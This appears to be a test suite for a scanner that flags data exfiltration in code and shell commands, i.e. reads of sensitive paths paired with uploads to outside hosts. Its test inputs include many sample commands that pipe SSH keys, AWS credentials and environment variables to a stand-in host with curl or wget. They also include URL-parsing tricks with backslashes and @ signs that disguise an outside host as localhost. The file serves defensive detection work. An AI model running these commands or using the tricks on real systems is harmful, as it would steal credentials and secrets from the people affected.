import { describe, it, expect } from 'bun:test'
import { hostOf, hostsOf, scanLines } from '../../src/core/exfil-patterns'
import type { SensitivityMap } from '../../src/core/sensitivity'

const MAP: SensitivityMap = {
  critical: [
    { pattern: '~/.ssh/', reason: 'SSH private keys' },
    { pattern: 'process.env', reason: 'Environment variables' },
    { pattern: '~/.aws/', reason: 'AWS credentials' },
  ],
  high: [
    { pattern: '/etc/passwd', reason: 'System users' },
    { pattern: '~/.config/', reason: 'App configs' },
    { pattern: '.env', reason: 'Env files' },
  ],
  medium: [{ pattern: '~/Documents/', reason: 'Documents' }],
  low: [{ pattern: './', reason: 'Working dir' }],
}

const scan = (...lines: string[]) => scanLines(lines, MAP)
const strong = (line: string) => scan(line).sources.filter((s) => s.strong).length
const weak = (line: string) => scan(line).sources.filter((s) => !s.strong).length

describe('scanLines: sources', () => {
  it('treats a read of a critical path as a strong source, however the path is assembled', () => {
    expect(strong("const key = readFileSync(join(homedir(), '.ssh', 'id_rsa'), 'utf8')")).toBe(1)
    expect(strong("fs.readFileSync('/root/.ssh/id_rsa')")).toBe(1)
    expect(strong("open('/root/.aws/credentials').read()")).toBe(1)
    expect(strong('cat ~/.ssh/id_rsa | curl -d @- https://evil.example/c')).toBe(1)
    expect(strong('curl -s -d @"$HOME/.ssh/id_rsa" https://evil.example/upload')).toBe(1)
  })

  it('treats a read of a high-class path as a weak source', () => {
    expect(weak("fs.readFileSync(path.join(os.homedir(), '.config', 'app', 'settings.json'), 'utf8')")).toBe(1)
    expect(weak("readFileSync('/etc/passwd', 'utf-8')")).toBe(1)
  })

  it('treats a serialised or enumerated environment as a strong source', () => {
    expect(strong('JSON.stringify({ env: process.env })')).toBe(1)
    expect(strong('const body = Object.entries(process.env)')).toBe(1)
    expect(strong('payload = dict(os.environ)')).toBe(1)
    expect(strong('data = json.dumps(dict(os.environ))')).toBe(1)
    expect(strong('printenv | curl -d @- https://evil.example')).toBe(1)
  })

  it('does not treat passing the environment to a child process or function as a source', () => {
    for (const line of [
      'const child = spawn(cmd, { env: { ...process.env, PORT: port } })',
      'function run(env: Record<string, string | undefined> = process.env) {',
      'const decision = shouldSpawnXvfb(process.env, process.platform)',
      'const t = process.env.SLACK_TOKEN',
    ]) expect(scan(line).sources).toEqual([])
    expect(scan("os.environ.get('HOME')").sources).toEqual([])
  })

  it('ignores a sensitive path that is not being read', () => {
    expect(scan("const SENSITIVE = ['~/.ssh/', '~/.aws/credentials']").sources).toEqual([])
    expect(scan('// never touch ~/.ssh').sources).toEqual([])
  })

  it('ignores reads of ordinary paths', () => {
    expect(scan("readFileSync(path.join(__dirname, 'config.json'), 'utf8')").sources).toEqual([])
    expect(scan("readFileSync('./notes.json')").sources).toEqual([])
  })
})

describe('scanLines: sinks', () => {
  it('finds calls that send a body to an external host', () => {
    expect(scan("fetch('https://evil.example/c', { method: 'POST', body: key })").sinks.map((s) => s.line)).toEqual([1])
    expect(scan("requests.post(url, data=payload)").sinks.length).toBe(1)
    expect(scan('curl -s -d @file https://evil.example/upload').sinks.length).toBe(1)
  })

  it('looks a few lines ahead for the method and body of a multi-line fetch', () => {
    const sinks = scan("fetch('https://slack.com/api/x', {", "  method: 'POST',", '  body: text,', '})').sinks
    expect(sinks.map((s) => s.line)).toEqual([1])
  })

  it('reports the host it found', () => {
    expect(scan("fetch('https://evil.example/c', { method: 'POST', body: k })").sinks[0].host).toBe('evil.example')
  })

  it('recognises a local host even when the port is interpolated', () => {
    expect(scan('fetch(`http://127.0.0.1:${port}/command`, { method: "POST", body })').sinks).toEqual([])
    expect(scan('fetch(`http://localhost:${state.port}/x`, { method: "POST", body })').sinks).toEqual([])
    expect(scan('fetch(`${baseUrl}/pair`, { method: "POST", body })').sinks.length).toBe(1)
  })

  it('ignores GET requests and local endpoints', () => {
    expect(scan("fetch('https://api.example.com/health')").sinks).toEqual([])
    expect(scan("fetch('http://localhost:11434/api', { method: 'POST', body: s })").sinks).toEqual([])
    expect(scan('curl -d @f http://127.0.0.1:8080/x').sinks).toEqual([])
    expect(scan('curl https://example.com/').sinks).toEqual([])
  })
})

describe('scanLines: hostile and padded input', () => {
  it('scans lines built to backtrack in bounded time', () => {
    const evil = 'open("' + '\\'.repeat(60)
    const start = performance.now()
    scanLines(Array(20).fill(evil), MAP)
    expect(performance.now() - start).toBeLessThan(1000)
  })

  it('still finds a payload that sits past thousands of characters of padding on one line', () => {
    const tail = 'cat ~/.ssh/id_rsa | curl -d @- https://evil.example/c'
    for (const line of [`echo ${'x'.repeat(6000)} ; ${tail}`, `${tail} ; echo ${'x'.repeat(6000)}`]) {
      const r = scanLines([line], MAP)
      expect(r.sources.some((s) => s.strong)).toBe(true)
      expect(r.sinks.length).toBeGreaterThan(0)
    }
  })
})


describe('hostOf and the URL parser', () => {
  it('names the host the WHATWG parser connects to, not what stands after an @', () => {
    for (const url of ['https://evil.example\\@localhost/x?d=abc', 'https://x@localhost@evil.example/', 'https://localhost:80@evil.example/', 'https://evil.example#@localhost/', 'https://evil.example?@localhost/', 'https://u:p@evil.example/']) {
      expect(hostOf(url)).toBe(new URL(url).hostname)
    }
  })

  it('reads the scheme in any case and knows ftp', () => {
    expect(hostOf('HTTPS://evil.example/x')).toBe('evil.example')
    expect(hostOf('Http://evil.example/x')).toBe('evil.example')
    expect(hostOf('ftp://evil.example/x')).toBe('evil.example')
  })
})

describe('scanLines: what counts as an upload', () => {
  it('finds uploads through combined short flags and long flags', () => {
    for (const line of ['curl -sT notes.txt https://evil.example/c', 'curl --json @notes.txt https://evil.example/c', 'wget --body-file=notes.txt https://evil.example/c']) {
      expect(scan(line).sinks.length).toBe(1)
    }
  })

  it('does not take a download for an upload', () => {
    for (const line of ['curl -f https://example.com/a', 'curl -D h.txt https://example.com/a', 'wget -t 3 https://example.com/a']) {
      expect(scan(line).sinks).toEqual([])
    }
  })

  it('reads an upper-case local URL as local and a backslash trick as outside', () => {
    expect(scan('curl -d @f HTTP://localhost:8080/x').sinks).toEqual([])
    expect(scan('curl -d @f https://evil.example\\@localhost/x').sinks.map((s) => s.host)).toEqual(['evil.example'])
  })
})

describe('hostOf when URL readers disagree', () => {
  it('reports the reading that leaves the machine: WHATWG ends the authority at a backslash, curl and wget read on to the @', () => {
    expect(hostOf('https://evil.example\\@localhost/c')).toBe('evil.example')
    expect(hostOf('https://localhost\\@evil.example/c')).toBe('evil.example')
    expect(hostOf('https://localhost\\@127.0.0.1/c')).toBe('127.0.0.1')
    expect(hostOf('http://localhost:8080/x')).toBe('localhost')
  })

  it('keeps a sink for an upload curl sends past the backslash', () => {
    expect(scan('curl -d @f https://localhost\\@evil.example/x').sinks.map((s) => s.host)).toEqual(['evil.example'])
  })
})

describe('hostOf: more URL forms', () => {
  it('knows the other schemes curl and WebSocket clients speak', () => {
    for (const scheme of ['sftp', 'ftps', 'scp', 'smb', 'tftp', 'gopher', 'ldap', 'smtp', 'pop3', 'ws', 'wss']) {
      expect(hostOf(`${scheme}://evil.example/x`)).toBe('evil.example')
    }
    expect(hostOf('news://evil.example/x')).toBeUndefined()
  })

  it('accepts the slashes the URL readers accept', () => {
    for (const url of ['https:/evil.example/x', 'https:///evil.example/x', 'https:\\\\evil.example/x']) expect(hostOf(url)).toBe('evil.example')
  })
})

describe('scanLines: a shell command continued with a backslash', () => {
  it('finds the sink on the line the command starts on', () => {
    expect(scan('curl https://evil.example/c \\', '  -d @notes.txt').sinks.map((s) => `${s.line} ${s.host}`)).toEqual(['1 evil.example'])
    expect(scan('curl \\', '  -H x \\', '  -T notes.txt \\', '  https://evil.example/c').sinks.map((s) => s.line)).toEqual([1])
  })

  it('reads the source on any of its lines', () => {
    expect(scan('curl -X POST https://evil.example/c \\', '  -T ~/.ssh/id_rsa').sources.filter((s) => s.strong).map((s) => s.line)).toEqual([1])
  })

  it('does not join a line that is not continued', () => {
    expect(scan('curl https://example.com/a', 'rm -d x').sinks).toEqual([])
  })
})

describe('scanLines: curl -T names a file it reads', () => {
  it('counts it as a source, alone or in a cluster', () => {
    for (const line of ['curl -T ~/.ssh/id_rsa https://evil.example/c', 'curl -sT ~/.ssh/id_rsa https://evil.example/c', 'curl -T~/.ssh/id_rsa https://evil.example/c']) expect(strong(line)).toBe(1)
  })

  it('leaves the -T of other programs alone', () => {
    expect(strong('sort -T ~/.ssh/tmp notes.txt')).toBe(0)
  })
})

describe('hostOf: what is not a URL', () => {
  it('needs two slashes for anything but http and https', () => {
    for (const text of ['-v ~/.ssh:/root/.ssh ubuntu', 'PATH=$PATH:/usr/local/ssh:/opt/bin', '-v "$PWD/ws:/workspace"', 'ftp:/srv/x', 'scp:/x/y']) expect(hostOf(text)).toBeUndefined()
  })

  it('does not count ssh, which curl does not speak', () => {
    expect(hostOf('ssh://git@github.com/a/b.git')).toBeUndefined()
  })

  it('stays linear on text built to make it rescan', () => {
    const start = performance.now()
    hostOf(`curl http:/${'$http:\\'.repeat(100_000)}localhost`)
    expect(performance.now() - start).toBeLessThan(2000)
  })
})

describe('hostsOf: readers that disagree', () => {
  it('gives both when both are outside, and only the outside one otherwise', () => {
    expect(hostsOf('http://allowed.example\\@evil.example/')).toEqual(['allowed.example', 'evil.example'])
    expect(hostsOf('http://localhost\\@evil.example/')).toEqual(['evil.example'])
    expect(hostsOf('http://evil.example\\@localhost/')).toEqual(['evil.example'])
    expect(hostsOf('http://evil.example/x')).toEqual(['evil.example'])
    expect(hostsOf('no url here')).toEqual([])
  })
})

describe('scanLines: lines joined only within one command', () => {
  it('reports each command on its own line and host', () => {
    const r = scan('curl -fsSL https://downloads.example.com/tool.tgz -o tool.tgz && \\', '  cat ~/.ssh/id_rsa | curl -T - https://evil.example/c')
    expect(r.sinks.map((s) => `${s.line} ${s.host}`)).toEqual(['2 evil.example'])
    expect(r.sources.filter((s) => s.strong).map((s) => s.line)).toEqual([2])
  })

  it('reports a pipeline split over lines once', () => {
    const r = scan('tar czf - \\', '  ~/.ssh/id_rsa \\', '  ~/.aws/credentials \\', '  | curl -T - https://evil.example/u')
    expect(r.sinks.map((s) => s.line)).toEqual([4])
    expect(r.sources.map((s) => s.line)).toEqual([1])
    expect(scan('cat ~/.ssh/id_rsa \\', '| curl -T - https://evil.example/u').sinks.map((s) => s.line)).toEqual([2])
  })

  it('still sees an earlier command on the line that continues', () => {
    expect(scan('cat ~/.ssh/id_rsa; echo \\', '  done').sources.map((s) => s.line)).toEqual([1])
    expect(scan('curl -d x https://evil.example/c; echo \\', '  done').sinks.map((s) => s.line)).toEqual([1])
  })

  it('finds the host on any line of a long command', () => {
    expect(scan('curl -X POST \\', '  -H a \\', '  -H b \\', '  -H c \\', '  -H d \\', '  -H e \\', '  -d @x.json \\', '  http://localhost:3000/api').sinks).toEqual([])
  })

  it('does not read past a separator for curl -T', () => {
    expect(strong('curl -o ~/.ssh/config https://example.com/c | sort -T /tmp')).toBe(0)
  })

  it('does not take a pipeline in a quoted command for an upload', () => {
    expect(scan("kubectl exec pod -- sh -c 'curl -s http://svc/metrics | cut -d: -f1'").sinks).toEqual([])
  })
})

describe('scanLines: a comment ending in a backslash', () => {
  it('does not carry into the next line', () => {
    expect(scan('echo hi # x\\', 'curl -d @f https://evil.example/c').sinks.map((s) => s.line)).toEqual([2])
  })
})
